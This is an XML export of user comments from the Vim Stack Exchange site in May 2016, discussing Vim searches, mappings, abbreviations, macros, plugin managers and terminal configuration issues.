  <row Id="13003" PostId="7835" Score="1" Text="I'm not sure why you thing Vim doesn't match the exact word but I suspect that you mean it doesn't respect the case of your pattern. If that's what you're talking about have a look at [`:h 'ignorecase'`](http://vimdoc.sourceforge.net/htmldoc/options.html#%27ignorecase%27) and [`:h 'smartcase'`](http://vimdoc.sourceforge.net/htmldoc/options.html#%27smartcase%27) which change the behavior of the searches and the handling of case in patterns." CreationDate="2016-05-17T19:10:30.587" UserId="1841" />
  <row Id="13004" PostId="7835" Score="2" Text="what I mean is if I search for head it will match header too, this is not what I want most of the time, and to just match head I need \&lt;head\&gt;" CreationDate="2016-05-17T19:14:48.453" UserId="1305" />
  <row Id="13005" PostId="7835" Score="0" Text="Oh ok I see. I'm not sure there is a built-in way to change that, let's hope someone can help you." CreationDate="2016-05-17T19:20:48.997" UserId="1841" />
  <row Id="13006" PostId="7837" Score="4" Text="Also note, that `*` on a word does `\&lt;word\&gt;` while `g*` does `word` searches. Same workflow applies using `&lt;c-r&gt;` but now you can chose which type of search and replace you perform." CreationDate="2016-05-17T20:08:34.833" UserId="895" />
  <row Id="13007" PostId="7836" Score="1" Text="Yes. Start by reading `:help autocmd` and `:help BufWrite`." CreationDate="2016-05-17T20:12:50.767" UserId="54" />
  <row Id="13008" PostId="7827" Score="0" Text="Nice. I like `a` even more! I almost always want my cursor at the end a change (like every other non-vim-editor)." CreationDate="2016-05-17T21:29:46.567" UserId="7654" />
  <row Id="13009" PostId="7837" Score="3" Text="You don't need `&lt;C-R&gt;/`. Just `:%s//replacement/g` with an empty search pattern will use the current search pattern, the one you created with `*`. See `:help last-pattern`." CreationDate="2016-05-18T00:25:42.913" UserId="2055" />
  <row Id="13010" PostId="7828" Score="0" Text="Thanks for the suggestion, but I want to use `Ctrl+;` to type `;`." CreationDate="2016-05-18T01:02:50.923" UserId="6349" />
  <row Id="13011" PostId="7837" Score="0" Text="@garyjohn Didn't know that!  My life just got a little bit easier.  I'll update the answer for posterity." CreationDate="2016-05-18T02:03:21.650" UserId="5229" />
  <row Id="13012" PostId="7834" Score="0" Text="How are you confirming that Neomake isn't working?  Also, I have to disagree with @Chong about `pylint`.  It doesn't seem to work with virtualenvs, and it's too opinionated for in-editor coding.  The linter should catch conformance issues while I'm working, not break my focus because something _could_ be better.  I would definitely use `pylint` for reviewing code before large commits to spot potential issues quickly, but I wouldn't want it to be the automated authority on what's passable." CreationDate="2016-05-18T02:36:36.960" UserId="5229" />
  <row Id="13017" PostId="7842" Score="2" Text="You could try with a function that compute the difference between the current column and the 80th one" CreationDate="2016-05-18T09:37:44.927" UserId="1821" />
  <row Id="13018" PostId="7842" Score="0" Text="How to access the &quot;no of times&quot; count? If I give 80|, it has to do something that many times. How to get that 80 number in mapping? I would prefer to use map" CreationDate="2016-05-18T09:41:37.487" UserId="7161" />
  <row Id="13019" PostId="7844" Score="7" Text="Use `getchar()`, 3 times?" CreationDate="2016-05-18T10:39:31.377" UserId="1800" />
  <row Id="13020" PostId="7845" Score="6" Text="Just to add that `:h getchar()` also describes some tricky cases to avoid (e.g. &quot;synthetic chars&quot; or special chars)." CreationDate="2016-05-18T10:54:03.183" UserId="1800" />
  <row Id="13021" PostId="7846" Score="1" Text="//goal is to just extend the line to an arbitrary column// This is what I wanted. My intention is not to insert spaces. Now only I was reading about this. But didn't have idea how to use it :)" CreationDate="2016-05-18T13:20:26.693" UserId="7161" />
  <row Id="13022" PostId="7842" Score="1" Text="I edited the question to make clear what you want." CreationDate="2016-05-18T13:27:30.960" UserId="1821" />
  <row Id="13024" PostId="7842" Score="1" Text="I am new to Vim, hence, I couldnot express what I wanted clearly. Thanks for making it clear." CreationDate="2016-05-18T13:35:35.107" UserId="7161" />
  <row Id="13025" PostId="7842" Score="0" Text="I should have tried :nmap &lt;bar&gt; $a . that might work but that's no exactly what I wanted." CreationDate="2016-05-18T13:38:55.047" UserId="7161" />
  <row Id="13026" PostId="7849" Score="1" Text="Thanks for the explanation." CreationDate="2016-05-18T14:04:56.067" UserId="7479" />
  <row Id="13028" PostId="7851" Score="1" Text="You shouldn't read a file like this in the first place, see http://mywiki.wooledge.org/BashFAQ/001" CreationDate="2016-05-18T15:24:23.733" UserId="5837" />
  <row Id="13029" PostId="7851" Score="0" Text="Thanks for pointing the reference.&#xA;&#xA;To me using &quot;cat | while read&quot; more readable that feeding the file at the end of the loop and I am aware of the sub-process restrictions. However the example was just to illustrate the unexpected behaviour." CreationDate="2016-05-18T15:34:20.810" UserId="7670" />
  <row Id="13030" PostId="7851" Score="2" Text="Maybe ask on [vi.se]?" CreationDate="2016-05-18T15:38:34.153" UserId="5837" />
  <row Id="13031" PostId="7851" Score="0" Text="Thanks for the link. I will consider it eventually. In the meantime I chose to feed the input at the end of the while-loop." CreationDate="2016-05-18T16:44:08.043" UserId="7670" />
  <row Id="13032" PostId="7852" Score="0" Text="Ok, that's a start I guess. I was wondering if there was not a vim parameter that I could tweak to get the expected behaviour." CreationDate="2016-05-18T15:35:21.800" UserId="7670" />
  <row Id="13033" PostId="7850" Score="0" Text="`clipboard=unnamedplus`. I don't see any difference." CreationDate="2016-05-18T17:55:54.040" UserId="6625" />
  <row Id="13034" PostId="7850" Score="1" Text="If you have the xterm-clipboard feature compiled in, the answers in the linked question apply in the terminal as well as GVim.  If not, you can hold shift while selecting text to get the default terminal text selection behavior. (i.e. selected text is available in the primary buffer.)" CreationDate="2016-05-18T21:13:26.347" UserId="1688" />
  <row Id="13035" PostId="7857" Score="0" Text="It's most likely because those shortcuts are being intercepted by your terminal, rather than a problem with vim. What terminal are you using?" CreationDate="2016-05-18T22:47:44.510" UserId="2920" />
  <row Id="13036" PostId="7857" Score="0" Text="Ah, that's totally possible. I'm using iTerm2 2.9.20160206 along with tmux 2.1. I'm not sure how to fix that though." CreationDate="2016-05-18T23:52:59.533" UserId="7675" />
  <row Id="13037" PostId="7856" Score="0" Text="Great! Is there any other differences between `view` and `vim -R`? I cannot understand why to otherwise create a new command." CreationDate="2016-05-19T05:00:13.380" UserId="2923" />
  <row Id="13038" PostId="5653" Score="0" Text="Perl is looking more and more interesting and powerful the older it gets." CreationDate="2016-05-19T05:03:44.330" UserId="5465" />
  <row Id="13039" PostId="7860" Score="0" Text="Edit : same works for :W to :w but my airline appearance changes when I do :W instead of :w" CreationDate="2016-05-19T06:08:17.150" UserId="7667" />
  <row Id="13041" PostId="7860" Score="0" Text="Works like a charm. Thank you !" CreationDate="2016-05-19T06:14:53.810" UserId="7667" />
  <row Id="13043" PostId="7860" Score="0" Text="For someone who might want to work with Qt more, that can pose a problem." CreationDate="2016-05-19T06:21:01.093" UserId="7667" />
  <row Id="13044" PostId="7860" Score="0" Text="If you have function names starting with W or Q also, it shouldn't be a problem. Our abbreviation works only when you type a space or a enter after W or Q. For function starting with Q or W, the next character will be a alphabet and not a space. So, it won't be a problem." CreationDate="2016-05-19T06:25:02.610" UserId="7161" />
  <row Id="13045" PostId="7860" Score="3" Text="_If you have function names starting with W or Q also, it shouldn't be a problem._ - Really?  [These guys](http://vim.wikia.com/wiki/Replace_a_builtin_command_using_cabbrev) must be thoroughly confused then. :)" CreationDate="2016-05-19T07:01:00.947" UserId="2313" />
  <row Id="13046" PostId="7860" Score="0" Text="In my case, it isnt a problem. I have used abbr, not map. Abbreviation expands only when we type a space or enter. I don't have one letter function. So, it isnt a problem. If I would have used cmap for it, every time when I type W or Q, it would have immediately changed to q or w." CreationDate="2016-05-19T07:18:52.363" UserId="7161" />
  <row Id="13047" PostId="7860" Score="1" Text="Try this: `:cabbr Q q`, then `:r Q`.  Then again, I suppose you'll tell me this isn't a problem either, because you're working on Windows, where filenames are case-insensitive. :)" CreationDate="2016-05-19T07:30:03.330" UserId="2313" />
  <row Id="13048" PostId="7860" Score="0" Text="Yes, it would be a problem if we have a single letter file. I name a file with more than four characters." CreationDate="2016-05-19T07:38:15.673" UserId="7161" />
  <row Id="13049" PostId="7860" Score="0" Text="You still don't get it, do you.  It's a problem whenever you need to type `Q` anywhere else than at the beginning of the line.  Try this: `:cabbr Q q`, then `:ZQ`.  But... you don't use commands ending with Q. :)" CreationDate="2016-05-19T07:48:37.730" UserId="2313" />
  <row Id="13050" PostId="7860" Score="0" Text="Let us [continue this discussion in chat](http://chat.stackexchange.com/rooms/39994/discussion-between-sibicoder-and-sato-katsura)." CreationDate="2016-05-19T07:50:11.327" UserId="7161" />
  <row Id="13052" PostId="7861" Score="0" Text="The map `;` to `:` may create some confusion if you have your muscle memory tuned to the `shift` `+` `:`" CreationDate="2016-05-19T08:59:10.113" UserId="7667" />
  <row Id="13053" PostId="7861" Score="0" Text="Of course, I wouldn't recommand it either, but some people do use it: https://www.youtube.com/watch?v=aHm36-na4-4" CreationDate="2016-05-19T09:01:57.040" UserId="1821" />
  <row Id="13054" PostId="7857" Score="1" Text="Have a look at http://vi.stackexchange.com/questions/7722/how-do-i-debug-my-mapping" CreationDate="2016-05-19T09:11:58.630" UserId="1821" />
  <row Id="13059" PostId="7825" Score="0" Text="Deoplete requires Python 3 support. Try setting the path to the Python interpreter, there are a documentation about Python settings in the NeoVim's GitHub page." CreationDate="2016-05-19T10:01:27.913" UserId="7563" />
  <row Id="13060" PostId="3496" Score="0" Text="Try manually putting the solarised.vim color scheme into the vim color folder." CreationDate="2016-05-19T10:03:28.687" UserId="7563" />
  <row Id="13061" PostId="493" Score="0" Text="Vim-Plug is one of the best plugin manager, it also offers asynchronous support in Neovim." CreationDate="2016-05-19T10:04:51.043" UserId="7563" />
  <row Id="13062" PostId="34" Score="0" Text="The asynchronous feature is a life saver. It makes vim so much more fluid and a lot of plugins can take advantage of it." CreationDate="2016-05-19T10:12:06.183" UserId="7563" />
  <row Id="13063" PostId="7862" Score="0" Text="You could do a &quot;search for boundaries&quot; function that check the id under the cursor and move left-right until this id change, this will give you the boundaries." CreationDate="2016-05-19T10:39:02.333" UserId="1821" />
  <row Id="13064" PostId="7862" Score="0" Text="@Nobe4 `synID()` gives the same id for both `&quot;A&quot;` and `&quot;B&quot;`." CreationDate="2016-05-19T10:51:20.853" UserId="7676" />
  <row Id="13065" PostId="7862" Score="0" Text="because they are both strings? It's normal. I'm not sure I understand your question here..." CreationDate="2016-05-19T10:58:21.330" UserId="1821" />
  <row Id="13066" PostId="7867" Score="1" Text="Have a look at `:h mksession` to start :)" CreationDate="2016-05-19T11:05:54.387" UserId="1821" />
  <row Id="13067" PostId="7862" Score="1" Text="@Nobe4 Edited. Two strings stick together, so there is no non-string characters in the middle of them to tell the boundary." CreationDate="2016-05-19T11:32:23.147" UserId="7676" />
  <row Id="13068" PostId="7867" Score="6" Text="Probably a dupe of [How to save window, split, and buffer layout?](http://vi.stackexchange.com/q/287/51)" CreationDate="2016-05-19T12:13:46.647" UserId="51" />
  <row Id="13069" PostId="7867" Score="0" Text="@Carpetsmoker: You're right, I didn't remember the question existed." CreationDate="2016-05-19T12:19:50.167" UserId="1841" />
  <row Id="13070" PostId="7867" Score="0" Text="Looks like that question covers the first two points, but I'm yet to find anything that covers the last one (remember changes to unsaved files)" CreationDate="2016-05-19T12:42:33.633" UserId="7678" />
  <row Id="13071" PostId="7862" Score="0" Text="I understand the problem, but I don't understand the need.  `indentexpr` would affect the space before `&quot;A&quot;`, not between `&quot;A&quot;` and `&quot;B&quot;`.  If `&quot;&quot;` is meant to be a quote escape, that would mean that `&quot;A&quot;&quot;B&quot;` is a whole string.  If they are actually supposed to be two separate strings, I would consider that a syntax error and not bother." CreationDate="2016-05-19T12:54:59.293" UserId="5229" />
  <row Id="13074" PostId="7869" Score="1" Text="Try them and decide for yourself. Or keep using whatever you used before." CreationDate="2016-05-19T13:01:02.710" UserId="54" />
  <row Id="13075" PostId="7869" Score="0" Text="What I used before is no longer maintained; and trying then deciding for myself was the plan anyway, however some users here could have more experience than I using them, and may point relevant facts I didn't notice (yet?)." CreationDate="2016-05-19T13:27:07.973" UserId="7681" />
  <row Id="13076" PostId="7869" Score="0" Text="As an answer to your edit: The original question lacks of an answer about dein.vim that's true but this is still a duplicate: answering your question would only dispatch the knowledge and make it less accessible for other users. Now you should consider reading the doc, trying it and adding your own answer that would be very valuable to the site." CreationDate="2016-05-19T13:28:22.320" UserId="1841" />
  <row Id="13077" PostId="7862" Score="1" Text="@TommyA Sorry. I've added back the real code. Two strings can be on different lines. And they can span multiple lines." CreationDate="2016-05-19T13:29:55.270" UserId="7676" />
  <row Id="13078" PostId="7869" Score="0" Text="understood. Now I understand better why this is marked as duplicate. I'm sorry I opened this question, in the light of what you just wrote, it was a mistake. But now I know better, thanks." CreationDate="2016-05-19T13:31:14.600" UserId="7681" />
  <row Id="13079" PostId="7869" Score="1" Text="No need to be sorry don't worry. Also I see you're a new user so welcome and don't hesitate to ask other questions when you'll need it :-)" CreationDate="2016-05-19T13:34:10.087" UserId="1841" />
  <row Id="13080" PostId="7862" Score="0" Text="@V.D.D Thanks, it's very clear now" CreationDate="2016-05-19T13:38:42.350" UserId="5229" />
  <row Id="13081" PostId="7870" Score="3" Text="I don't think it's possible but you can have a look at this plugin: https://github.com/tpope/vim-abolish it achieve exactly that, and more." CreationDate="2016-05-19T14:40:33.840" UserId="1821" />
  <row Id="13082" PostId="7862" Score="0" Text="@V.D.D I answered the issue regarding string boundaries, but in the case of `indentexpr`, wouldn't the parent block affect the indentation regardless?" CreationDate="2016-05-19T14:47:57.263" UserId="5229" />
  <row Id="13085" PostId="7869" Score="0" Text="For the record, I came here looking for an answer to this exact comparison (with all the same intentions of using both, etc). I came here after reading the linked duplicate actually, because nowhere in the duplicate is Dein mentioned. I would've preferred to allow this question to be answered, then later merged with the other. As it stands, marking this as duplicate wasn't helpful to me in this instance." CreationDate="2016-05-19T18:10:07.850" UserId="685" />
  <row Id="13086" PostId="7869" Score="1" Text="WTF is &quot;dark-powered&quot;? I know Shougo develops a lot of plugins, and that their English isn't that great, but an explanation of that would be a minimal requirement of documentation." CreationDate="2016-05-19T19:37:26.070" UserId="205" />
  <row Id="13087" PostId="7869" Score="0" Text="7heo.tk, both managers are parellel/async so the performance is going to be a lot better than the other ones. However, vim-plug's async feature can only be used in neovim while dein.vim use Shougo's own async dll library so it can run in vim as well. At the end of the day, they are basically the same. Hope this helps" CreationDate="2016-05-19T20:30:09.420" UserId="7563" />
  <row Id="13088" PostId="626" Score="0" Text="To use neovim, set `git config --global mergetool.path nvim` (along with `diff.tool` as specified in the answer)." CreationDate="2016-05-19T20:52:04.863" UserId="69" />
  <row Id="13089" PostId="7869" Score="0" Text="@Red2awn doesn't [vim-plug's README](https://github.com/junegunn/vim-plug#pros) say that async works in Vim if Ruby or Python is available?" CreationDate="2016-05-19T23:28:59.630" UserId="205" />
  <row Id="13091" PostId="7869" Score="1" Text="Yes you are right, it does support asynchronous in Vim. Anyway, I tried dein.vim yesterday and it is not the most user friendly plugin manager. So I would recommend Vim-Plug." CreationDate="2016-05-20T06:37:44.993" UserId="7563" />
  <row Id="13092" PostId="7878" Score="0" Text="Please let me know if this was done intentionally." CreationDate="2016-05-20T06:49:16.243" UserId="7161" />
  <row Id="13093" PostId="7871" Score="0" Text="Ah, I have to count the quote with regexps. Thanks!" CreationDate="2016-05-20T07:11:16.703" UserId="7676" />
  <row Id="13094" PostId="7862" Score="0" Text="@TommyA Because I need to know the previous string is indeed closed." CreationDate="2016-05-20T07:13:12.027" UserId="7676" />
  <row Id="13095" PostId="7879" Score="3" Text="If some &quot;unique&quot; lines are the same, how are they unique? O.o What makes them unique?" CreationDate="2016-05-20T07:39:38.527" UserId="205" />
  <row Id="13096" PostId="7879" Score="2" Text="It's quite complex (as in O(N²)) to delete duplicates when the file is not sorted. In the case your file is sorted, or can be sorted, your question becomes a duplicate of this one: http://vi.stackexchange.com/questions/5362/delete-all-consecutive-duplicates/5363#5363" CreationDate="2016-05-20T07:48:20.330" UserId="626" />
  <row Id="13098" PostId="7879" Score="0" Text="@muru I think I can say it is like a 2-dimensional array: 98x130. I need to keep 98 lines and delete the other 129 lines, some of the line is the same to each other (but I still need to keep it 98)." CreationDate="2016-05-20T07:57:37.260" UserId="7575" />
  <row Id="13099" PostId="7879" Score="0" Text="@LucHermitte Yes you might be right, but unfortunately I must not sort it." CreationDate="2016-05-20T07:57:40.917" UserId="7575" />
  <row Id="13100" PostId="7879" Score="0" Text="So, can you say you have to keep every 130th line? (Keep 1, delete 2-130, keep 131, delete 132-270, etc.)?" CreationDate="2016-05-20T08:00:32.407" UserId="205" />
  <row Id="13101" PostId="7881" Score="1" Text="the 5th phase, I think my similar lines is not deleted according to your answer. Or perhaps I do things wrongly? This is my first time using macro though, I would be very glad if you can edit the answer to become more &quot;newbie-friendly&quot;" CreationDate="2016-05-20T08:02:48.477" UserId="7575" />
  <row Id="13102" PostId="7879" Score="0" Text="@muru indeed, that is I'm trying to achieve." CreationDate="2016-05-20T08:03:22.150" UserId="7575" />
  <row Id="13103" PostId="7881" Score="1" Text="That's an interesting approach, but it could be improved: as you don't provide an end condition the macro will loop indefinitely (It is of course possible to stop it with `ctrl-c`. Also it changes the order of the lines (the last one becomes the first one)." CreationDate="2016-05-20T08:09:12.960" UserId="1841" />
  <row Id="13104" PostId="7879" Score="5" Text="@v8areu: You should rephrase your question to indicate that clearly: it is much easier to do that :-) Something like: `qaq` then `qa129dd@aq` then `@a` should do the trick." CreationDate="2016-05-20T08:10:49.287" UserId="1841" />
  <row Id="13105" PostId="7879" Score="0" Text="Just to be sure. Are your duplicated lines grouped together, or can they be scattered? i.e. Do you need to reduce &quot;1,2,3,1,5,8,2&quot; to &quot;1,2,3,5,8&quot;?" CreationDate="2016-05-20T08:16:07.033" UserId="626" />
  <row Id="13107" PostId="7882" Score="4" Text="If the file is really organized this way, it'd be safer to use one of the `uniq` emulation: http://vi.stackexchange.com/questions/5362/delete-all-consecutive-duplicates/5363, no need to detect/count the number of replications." CreationDate="2016-05-20T08:24:03.707" UserId="626" />
  <row Id="13108" PostId="7882" Score="3" Text="@LucHermitte yes, it's just re-implementing plain ol' `uniq` in Vim. I suppose it's a matter of how the question should have been phrased: remove duplicates, or keep every *n*th line?" CreationDate="2016-05-20T08:26:34.450" UserId="205" />
  <row Id="13111" PostId="7879" Score="0" Text="The last edit let me think you're not in the case I've presented in my last comment. I deduce you are looking for an emulation of uniq, and thus, your question is a duplicate of http://vi.stackexchange.com/questions/5362/delete-all-consecutive-duplicates/5363 Do you confirm my analysis?" CreationDate="2016-05-20T08:30:25.990" UserId="626" />
  <row Id="13112" PostId="7879" Score="2" Text="@LucHermitte on second thought, it might not be: it seems they want to reduce &quot;1,1,1,2,2,2,3,3,3,3,3,3,5,5,5&quot; to &quot;1,2,3,3,5&quot; (not &quot;1,2,3,5&quot; as `uniq` would have done)." CreationDate="2016-05-20T08:37:46.430" UserId="205" />
  <row Id="13113" PostId="7882" Score="2" Text="I've missed the fact that the OP observes that too many lines are removed when he applied uniq. I guess he has duplicated series of lines he wish to keep. In other word, he seems to be looking for &quot;keep one line every _n_&quot; and not uniq. My mistake. You're answering his needs." CreationDate="2016-05-20T08:39:51.997" UserId="626" />
  <row Id="13114" PostId="7879" Score="0" Text="@muru, that's the conclusion I've came to as well. uniq is not the solution then." CreationDate="2016-05-20T08:40:55.120" UserId="626" />
  <row Id="13115" PostId="7878" Score="0" Text="Answer updated." CreationDate="2016-05-20T08:57:17.863" UserId="1821" />
  <row Id="13116" PostId="7123" Score="0" Text="The snake one would be great to get new users to develop muscle memory for the hjkl keys!" CreationDate="2016-05-20T09:14:25.460" UserId="7642" />
  <row Id="13121" PostId="7882" Score="2" Text="I just know the %norm command can do the trick just fine, the other answer is also right, but this answer is neater. Thanks guys." CreationDate="2016-05-20T10:00:45.760" UserId="7575" />
  <row Id="13124" PostId="7881" Score="1" Text="Don't know how to stop looping macro with a condition (without using a function). So, editing answer by getting the unique lines from :sort u command and then proceeding macro." CreationDate="2016-05-20T10:37:05.920" UserId="7161" />
  <row Id="13125" PostId="7869" Score="2" Text="@7heo.tk: I tested dein.vim to add [an answer](http://vi.stackexchange.com/a/7886/1841) to the original question. I hope that will be useful to you. If you see things to add, don't hesitate to edit my answer :-)" CreationDate="2016-05-20T12:33:08.930" UserId="1841" />
  <row Id="13126" PostId="7878" Score="1" Text="Related [Vimcasts](http://vimcasts.org/) episode: [Creating mappings that accept a count](http://vimcasts.org/episodes/creating-mappings-that-accept-a-count/)" CreationDate="2016-05-20T14:23:14.243" UserId="778" />
  <row Id="13127" PostId="7887" Score="1" Text="That's really strange. It seems like a bug to me. This isn't the ideal solution, but you could do `:nnoremap di( vT(Ot)d` The only downside is that this doesn't work with `ci(`, `yi(`, `vi(`, `da(` and the endless variations." CreationDate="2016-05-20T16:47:34.233" UserId="2920" />
  <row Id="13128" PostId="7887" Score="0" Text="DJ McMayhem: I think you're right. I had this bug using an old version of 7.4 (2013 Aug 10, unpatched). `di(` works as desired in newer versions." CreationDate="2016-05-20T17:58:46.830" UserId="361" />
  <row Id="13129" PostId="7885" Score="0" Text="Fantastic, this is exactly what I wanted, and great explanation, thank you!" CreationDate="2016-05-20T20:19:41.913" UserId="7642" />
  <row Id="13130" PostId="7894" Score="0" Text="Read the documentation." CreationDate="2016-05-20T21:20:41.703" UserId="54" />
  <row Id="13131" PostId="7895" Score="0" Text="Thanks, I though that is for debugging YCM O_o" CreationDate="2016-05-20T21:35:33.813" UserId="7563" />
  <row Id="13132" PostId="7896" Score="0" Text="Run `:verbose set fo` and see what set it last." CreationDate="2016-05-20T21:37:17.730" UserId="205" />
  <row Id="13133" PostId="7896" Score="0" Text="@muru `Last set from ~/.vimrc`. Weird..." CreationDate="2016-05-20T21:44:01.723" UserId="7642" />
  <row Id="13134" PostId="7897" Score="1" Text="Ah, that's it, thanks! When I first open the file, `vim.vim` is sourced after `vimrc`, so the options are set right. So now I need a way to re-source the `ftplugin`s after I source `vimrc`, so I can map a key to do both one after the other. Any ideas?" CreationDate="2016-05-20T21:56:38.977" UserId="7642" />
  <row Id="13135" PostId="7897" Score="2" Text="Probably set the filetype again? Something like `:let &amp;ft=&amp;ft`" CreationDate="2016-05-20T21:58:15.513" UserId="205" />
  <row Id="13136" PostId="7897" Score="0" Text="Yes, something like that... but unfortunately not that, it does nothing. And `:set ft=&amp;ft` sets the `filetype` to &quot;&amp;ft&quot;." CreationDate="2016-05-20T22:02:49.853" UserId="7642" />
  <row Id="13137" PostId="7897" Score="1" Text="Are you sure it does nothing? In my case, it resets `fo` to `croql` (my original setting for vim files)." CreationDate="2016-05-20T22:03:37.297" UserId="205" />
  <row Id="13138" PostId="7897" Score="0" Text="Oops, you're right! I must have made a typo or something. That's perfect, thank you!" CreationDate="2016-05-20T22:05:25.400" UserId="7642" />
  <row Id="13139" PostId="7901" Score="0" Text="Easier than I thought, thanks!" CreationDate="2016-05-21T02:15:45.153" UserId="584" />
  <row Id="13140" PostId="7902" Score="0" Text="Are you looking for `:help -f`?" CreationDate="2016-05-21T06:14:31.533" UserId="54" />
  <row Id="13141" PostId="7899" Score="1" Text="No, this can't be done in a *practical* way. Vim is perfectly capable of handling dozens and dozens of buffers, use its power." CreationDate="2016-05-21T06:18:29.467" UserId="54" />
  <row Id="13142" PostId="7898" Score="0" Text="What does the documentation say?" CreationDate="2016-05-21T06:19:03.690" UserId="54" />
  <row Id="13143" PostId="7902" Score="0" Text="@romainl I added `-f` to the call to gVim and it made no difference; it sill steals focus on every call. What were you thinking it would do?" CreationDate="2016-05-21T08:26:58.237" UserId="7701" />
  <row Id="13144" PostId="7904" Score="7" Text="Instead of typing `&lt;`, `C`, `R`, `&gt;`, press `&lt;C-v&gt;` then `&lt;return&gt;` to insert a literal `^M`." CreationDate="2016-05-21T11:12:53.177" UserId="54" />
  <row Id="13145" PostId="2848" Score="0" Text="This is awesome! What I *wish* I could do is have the function run a macro, like &quot;move forward to the next sentence `)` and insert a newline; repeat until you get to the end of the range.&quot; Then it would presumably apply any indentation rules. But my Vim-fu is too weak for that. :)" CreationDate="2016-05-21T11:13:25.247" UserId="7702" />
  <row Id="13146" PostId="7904" Score="4" Text="Other way to do is with 'o'. :normal! )o. It automatically start inserting at next line." CreationDate="2016-05-21T11:21:17.247" UserId="7161" />
  <row Id="13147" PostId="7882" Score="0" Text="I don't get the last paragraph of this answer.  Wouldn't `:g/^/norm 129dd` do exactly the same thing as `:%norm 129dd`?" CreationDate="2016-05-21T11:41:43.863" UserId="4676" />
  <row Id="13148" PostId="7905" Score="0" Text="`:help press-enter`" CreationDate="2016-05-21T16:18:33.347" UserId="54" />
  <row Id="13149" PostId="7906" Score="0" Text="Nice, does that mean we can escape arbitrary key with execute?" CreationDate="2016-05-21T17:00:30.917" UserId="1821" />
  <row Id="13150" PostId="7906" Score="1" Text="@nobe4 Only those listed in [`:h keycodes`](http://vimhelp.appspot.com/intro.txt.html#keycodes), I think (which is a lot of keys, but not all of them)" CreationDate="2016-05-21T17:02:14.073" UserId="205" />
  <row Id="13151" PostId="7882" Score="2" Text="@Wildcard no. (Try it, you'll get an empty buffer.) `g` works by tagging every line that matches, and then running the command on only those lines, irrespective of whether those lines were modified, displaced or deleted by the command. `%` just runs from the first line to the last. So, in this case, `g/^/ norm 4dd`, for example, would delete lines 1, 2, 3, 4 while at the first line, then move to the now-deleted second line, and delete lines 2, 3, 4, 5 (instead of moving to 5, and deleting 5, 6, 7, 8). See http://vi.stackexchange.com/a/3967/205. Compare: `g/\%&lt;8l/ norm 2dd` and `1,7 norm 2dd`." CreationDate="2016-05-21T17:35:53.080" UserId="205" />
  <row Id="13152" PostId="7882" Score="1" Text="Oh, I think I see.  But it's not true that `g` runs on lines that were already deleted, only that it runs on the next marked line still existing even when that line now has a line number lower than the last line that was run (unlike `%` which will run on the next consecutive line number according to the *new* numbering).  For example, `g/^/+,+2d` will only delete 2 out of every 3 lines—it doesn't run on deleted lines." CreationDate="2016-05-21T18:02:15.167" UserId="4676" />
  <row Id="13153" PostId="7882" Score="1" Text="In other words, `g/^/ norm 4dd` *doesn't* move to the now-deleted second line as you say—it's even mentioned in the answer you just linked to: &quot;If a line is deleted its mark disappears.&quot;" CreationDate="2016-05-21T18:04:06.537" UserId="4676" />
  <row Id="13154" PostId="7892" Score="0" Text="`:set number` works. I wonder if there is any way to set the line number in the vimrc file. (question updated.)" CreationDate="2016-05-21T18:05:04.957" UserId="1080" />
  <row Id="13155" PostId="7882" Score="1" Text="@Wildcard you're right. I thought I saw some behaviour that would have been explained by it moving to a deleted line, but it looks like I was wrong." CreationDate="2016-05-21T18:08:32.570" UserId="205" />
  <row Id="13156" PostId="7890" Score="1" Text="I don't have any Vim that old on hand to test, but if Netrw sets the filetype to be `netrw` in V125, you could try `au FileType netrw set nu`, perhaps." CreationDate="2016-05-21T18:49:53.650" UserId="205" />
  <row Id="13157" PostId="7891" Score="1" Text="Ok, but why is it not letting me quit?" CreationDate="2016-05-21T20:09:00.297" UserId="6952" />
  <row Id="13158" PostId="7890" Score="0" Text="I added that line to my vimrc, but it didn't work." CreationDate="2016-05-21T20:29:34.243" UserId="1080" />
  <row Id="13159" PostId="7890" Score="0" Text="what's the output of `vim --version`?" CreationDate="2016-05-21T20:30:18.370" UserId="205" />
  <row Id="13160" PostId="7890" Score="0" Text="version is vim 7.0" CreationDate="2016-05-21T20:31:03.080" UserId="1080" />
  <row Id="13161" PostId="7890" Score="0" Text="no, the full output please. Anyway, with a Vim that old, it won't matter, I suppose." CreationDate="2016-05-21T20:31:43.357" UserId="205" />
  <row Id="13162" PostId="7890" Score="0" Text="`VIM - Vi IMproved 7.0(2006 May 7, compiled Aug 4 2010 07:00:00)`" CreationDate="2016-05-21T21:46:37.390" UserId="1080" />
  <row Id="13163" PostId="7898" Score="0" Text="I have read all the documentation. I know the buffer is unmodifiable, and I am interested in workarounds or tips that people used to overcome this limitation." CreationDate="2016-05-22T02:11:41.757" UserId="7318" />
  <row Id="13164" PostId="5292" Score="1" Text="Thanks, noticed that there's a missing '=' in the suggested answer. Should be &quot;let g:syntastic_mode_map = { ... &quot;" CreationDate="2016-05-22T07:53:24.747" UserId="3240" />
  <row Id="13165" PostId="7892" Score="0" Text="In your vimrc file you can simply put `set number`. This will, of course put line numbers in all files, not just netrw. If you want just netrw you probably could set up some autocmds to set that option when a netrw buffer opens." CreationDate="2016-05-22T13:33:31.263" UserId="6489" />
  <row Id="13166" PostId="4959" Score="0" Text="I have set encoding, fileencoding, termencoding to utf-8. Facing similar issue. Some complex unicode characters arent shown properly. How to fix it?" CreationDate="2016-05-22T13:43:20.677" UserId="7161" />
  <row Id="13167" PostId="7458" Score="0" Text="It has several issues. It doesn't show unicode characters properly. Some multi-byte characters are hidden." CreationDate="2016-05-22T14:13:31.907" UserId="7161" />
  <row Id="13168" PostId="7458" Score="1" Text="Yup that's precisely why i specified that &quot;None of them are flawless&quot;: so far Cygwin (and equivalents) are just workaround. I'm not a Windows expert but maybe the new collaborative work between Canonical and Microsoft will lead to some better alternatives." CreationDate="2016-05-22T14:34:54.313" UserId="1841" />
  <row Id="13169" PostId="7907" Score="0" Text="Amazing! @nobe4" CreationDate="2016-05-22T15:11:46.813" UserId="6950" />
  <row Id="13170" PostId="7909" Score="0" Text="Thanks for looking into it. It's a hell of an annoying issue, so I certainly hope Ubuntu picks up the fix." CreationDate="2016-05-22T16:21:54.933" UserId="850" />
  <row Id="13171" PostId="7910" Score="1" Text="Probably because of the font used in your terminal. It would help if you could provide more info, such as what is your `listchars` option, and what specifially does not work in terminal vim. Which terminal are you using, and on which OS." CreationDate="2016-05-22T21:48:55.517" UserId="21" />
  <row Id="13172" PostId="7910" Score="4" Text="Try `&lt;C-@&gt;` instead of `&lt;C-Space&gt;`." CreationDate="2016-05-22T22:12:01.677" UserId="54" />
